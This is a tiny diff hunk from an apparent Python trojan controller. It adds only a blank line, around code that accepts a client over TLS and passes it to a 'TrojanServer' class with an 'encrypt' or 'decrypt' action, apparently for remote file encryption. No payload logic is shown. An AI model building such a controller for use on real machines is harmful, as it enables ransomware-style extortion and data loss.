@@ -141,5 +141,6 @@ if __name__ == "__main__":
     action = "decrypt"  # enter "encrypt" or "decrypt" manually
 
     conn = SecureSocketServer(CERT, KEY).accept_client()
+    
     with conn:
         TrojanServer(action, conn).handle_client()
